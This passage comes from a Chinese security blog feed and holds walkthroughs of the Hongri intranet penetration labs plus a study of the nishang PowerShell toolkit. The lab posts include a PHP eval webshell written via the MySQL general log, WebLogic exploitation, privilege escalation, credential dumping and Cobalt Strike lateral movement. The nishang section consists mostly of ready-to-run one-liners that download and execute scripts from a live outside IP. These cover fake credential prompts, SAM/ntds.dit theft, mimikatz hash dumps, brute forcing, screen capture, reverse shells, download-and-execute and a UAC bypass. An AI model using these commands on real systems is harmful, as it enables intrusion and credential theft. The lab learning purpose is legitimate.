class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启日志记录:</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">#查看当前的日志目录:</span><br>show variables like <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">#指定日志文件</span><br><span class="hljs-built_in">set</span> global general_log_file = <span class="hljs-string">&quot;指定日志文件的路径&quot;</span>;<br></code></pre></td></tr></table></figure><p>我们在前面通过phpstudy的探针可以知道网站的路径<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155650584.png" alt="image-20240107155650584"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155659302.png" alt="image-20240107155659302">设置成功，写入代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_POST</span>[&#x27;x&#x27;]); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155707463.png" alt="image-20240107155707463">用蚁剑连接<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155720353.png" alt="image-20240107155720353">我这里直接用蚁剑上线C2马子<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155729055.png" alt="image-20240107155729055">内网渗透</p><p>这里直接就是管理员权限了<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155736518.png" alt="image-20240107155736518">用mimikatz跑一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155745730.png" alt="image-20240107155745730">查看网卡<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155753847.png" alt="image-20240107155753847">看看内网存活有那些主机和端口情况<br>这里应因为内网机不出网，密码也跑出来，万事具备只欠东风了(这里图片挂掉了)</p><p>首先在已上线的机器上创建如下监听，监听端口可自定义。利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155801514.png" alt="image-20240107155801514"></p><p>生成payload载荷<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155809114.png" alt="image-20240107155809114">这里选择我们刚刚创建的那个listener<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155817857.png" alt="image-20240107155817857">将生成的载荷上传到目标机器，并执行<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155828131.png" alt="image-20240107155828131"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155836668.png" alt="image-20240107155836668"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155845217.png" alt="image-20240107155845217">接下来就可以对其他的内网机进行上线了<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155855652.png" alt="image-20240107155855652"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155904156.png" alt="image-20240107155904156">全部成功上线<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155914178.png" alt="image-20240107155914178">因为这是link链接，只要主链路（即出网机Listener)掉线，就都会掉线！</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机二</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/</url>
    
    <content type="html"><![CDATA[<p>大致拓扑图如下</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154925962.png" alt="image-20240107154925962"></p><p>web win server2008(10.0.10.80,192.168.1.16)</p><p>pc win7(10.10.10.201)</p><p>dc win server2012(10.10.10.10)</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>端口探测</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154942829.png" alt="image-20240107154942829"></p><p>发现有7001端口，可能存在weblogic</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154953594.png" alt="image-20240107154953594"></p><p>确实存在探测下目录</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155006459.png" alt="image-20240107155006459"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155014833.png" alt="image-20240107155014833"></p><p>弱口令无果，尝试用工具利用</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155023939.png" alt="image-20240107155023939"></p><p>存在漏洞并且返回了用户名</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155033016.png" alt="image-20240107155033016"></p><p>能成功执行命令，我这里就直接上传webshell。</p><p>关于weblogic上传路径问题请参考：<a href="https://www.cnblogs.com/sstfy/p/10350915.html">https://www.cnblogs.com/sstfy/p/10350915.html</a></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155041631.png" alt="image-20240107155041631"></p><p>因为这里目标机有杀软上传普通马子会被连不上，所以我这里直接用冰歇的马子</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155052955.png" alt="image-20240107155052955"></p><p>为了方便操作弹个shell到c2上</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155100840.png" alt="image-20240107155100840"></p><p>提下权（我这里用的ms15-051）</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155108633.png" alt="image-20240107155108633"></p><p>信息收集一波</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155117697.png" alt="image-20240107155117697"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155125604.png" alt="image-20240107155125604"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155133795.png" alt="image-20240107155133795"></p><p>基本可判断域控主机为10.10.10.10</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155141858.png" alt="image-20240107155141858"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155149638.png" alt="image-20240107155149638"></p><p>看一下内网主机存活情况</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155157985.png" alt="image-20240107155157985"></p><p>抓下密码进行横向</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155206468.png" alt="image-20240107155206468"></p><p>这里由于目标机不出网，这里做链路上线。</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155215627.png" alt="image-20240107155215627"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155222652.png" alt="image-20240107155222652"></p><p>生成载荷上传目标机并执行</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155230464.png" alt="image-20240107155230464"></p><p>利用抓取得凭证进行批量上线</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155240138.png" alt="image-20240107155240138"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nishang学习</title>
    <link href="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="nishang模块及其功能"><a href="#nishang模块及其功能" class="headerlink" title="nishang模块及其功能"></a>nishang模块及其功能</h2><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Antak-Webshell</td><td>webshell</td></tr><tr><td>Backdoors</td><td>后门</td></tr><tr><td>Client</td><td>客户端</td></tr><tr><td>Escalation</td><td>提权</td></tr><tr><td>Execution</td><td>RCE</td></tr><tr><td>Gather</td><td>信息收集</td></tr><tr><td>Misc</td><td>杂项</td></tr><tr><td>Pivot</td><td>跳板&#x2F;远程控制  EXE</td></tr><tr><td>Scan</td><td>扫描</td></tr><tr><td>powerpreter</td><td>Meterreter会话</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li><p><strong>Check-VM</strong><br>检查是否为虚拟机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span>;Check<span class="hljs-literal">-VM</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175648796.png" alt="image-20240107175648796"></p></li><li><p><strong>Invoke-CredentialsPhish</strong><br>欺骗目标主机用户，让用户输入密码。</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175658135.png" alt="image-20240107175658135"><br>输入密码弹框才会消失<br><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175707103.png" alt="image-20240107175707103"></p><ul><li><strong>Copy-VSS</strong><br>这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和system hive也能被拷贝出来</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/  <br>//<span class="hljs-built_in">copy-vss</span>  <span class="hljs-comment">#把文件保存到当前路径下</span><br>//<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure><ul><li><strong>FireBuster  FireListener扫描器</strong><br>对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span><span class="hljs-literal">-150</span><br><span class="hljs-comment">#接着输入如下命令</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168</span>.<span class="hljs-number">43.161</span> <span class="hljs-number">130</span><span class="hljs-literal">-150</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175724581.png" alt="image-20240107175724581"></p><ul><li><strong>Invoke Mimikatz</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nvoke<span class="hljs-literal">-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>    <span class="hljs-comment">##Dump出本机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>   <span class="hljs-literal">-ComputerName</span> <span class="hljs-selector-tag">@</span>（“computer1”，“computer2”） <span class="hljs-comment">##Dump 出远程的两台计算机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;privillage::debug exit&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;computer1&quot;</span> <span class="hljs-comment">##在远程的一台机器上运行Mimikatz并执行 &quot;privillage::debug exit&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175814167.png" alt="image-20240107175814167"></p><ul><li><p><strong>Get-PassHashes</strong><br>需administrator权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175829566.png" alt="image-20240107175829566"></p></li><li><p><strong>Get-PassHints</strong><br>获取用户的密码提示信息，需administrator权限，可根据提示信息生成密码字典提高爆破成功几率</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHints</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175843139.png" alt="image-20240107175843139"></p></li><li><p><strong>Invoke-PortScan</strong></p></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>StartAddress</td><td>扫描范围开始的地址</td></tr><tr><td>EndAddress</td><td>扫描范围结束的地址</td></tr><tr><td>ScanPort</td><td>进行端口扫描</td></tr><tr><td>Port</td><td>执行端口，有默认端口</td></tr><tr><td>Timout</td><td>超时时间</td></tr><tr><td>ResolveHost</td><td>存活主机并解析主机名</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; <span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.50</span> <span class="hljs-literal">-ResolveHost</span>  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175855893.png" alt="image-20240107175855893"></p><ul><li><strong>Invoke-BruteForce</strong><br>对SQL Server，域控制器(ActiveDirectory)，web以及ftp弱口令爆破</li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>ComputerName</td><td>对应服务的计算机名</td></tr><tr><td>UserList</td><td>用户名字典</td></tr><tr><td>PasswordList</td><td>密码字典</td></tr><tr><td>Service</td><td>服务  默认为sql服务</td></tr><tr><td>Delay</td><td>延迟时间</td></tr><tr><td>StopOnSucess</td><td>匹配一个后停止</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-BruteForce</span> <span class="hljs-literal">-ComputerName</span> WEB <span class="hljs-literal">-UserList</span>  C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-PasswordList</span> C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-Service</span> FTP <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><ul><li><strong>屏幕窃取</strong><br>Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面。</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">443</span>  <span class="hljs-comment">#Reverse反向连接 Bind  正向连接</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br>nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">1111</span>| nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">9999</span>   <span class="hljs-comment">#访问本机9999端口即可</span><br></code></pre></td></tr></table></figure><h2 id="powershell-隐藏通信隧道"><a href="#powershell-隐藏通信隧道" class="headerlink" title="powershell 隐藏通信隧道"></a>powershell 隐藏通信隧道</h2><ul><li>I<strong>nvoke-PowershellTcp</strong></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>IPAddress</td><td>选择-Reverse选项时表示需要连接的IP地址</td></tr><tr><td>Port<int32></int32></td><td>选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口</td></tr><tr><td>Reverse</td><td>反向连接</td></tr><tr><td>Bind</td><td>正向连接</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#反向</span><br>nc <span class="hljs-literal">-lvp</span> <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br>nc <span class="hljs-literal">-nv</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span>  <span class="hljs-literal">-Bind</span>  <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175926709.png" alt="image-20240107175926709"></p><ul><li><strong>Invoke-PowershellUdp</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">正向：nc <span class="hljs-literal">-nvu</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc <span class="hljs-literal">-lup</span> <span class="hljs-number">3333</span><br><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellUdp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175938290.png" alt="image-20240107175938290"></p><ul><li><strong>Invoke-PoshRatHttp和Invoke-PoshRatHttps</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HTTP：    <span class="hljs-built_in">Invoke-PoshRatHttp</span>  <span class="hljs-literal">-IPAddress</span>  <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br>HTTPS： <span class="hljs-built_in">Invoke-PoshRatHttps</span>  <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175951060.png" alt="image-20240107175951060"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul><li><strong>下载执行</strong><br>Download_Execute是Nishang中下载执行脚本</li></ul><p>ExetoText</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure><ul><li><strong>Bypass UAC</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#使用sysprp方法执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br><span class="hljs-comment">#使用oobe方法并执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment">#使用-Payload参数可以自行指定执行的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Payload</span> <span 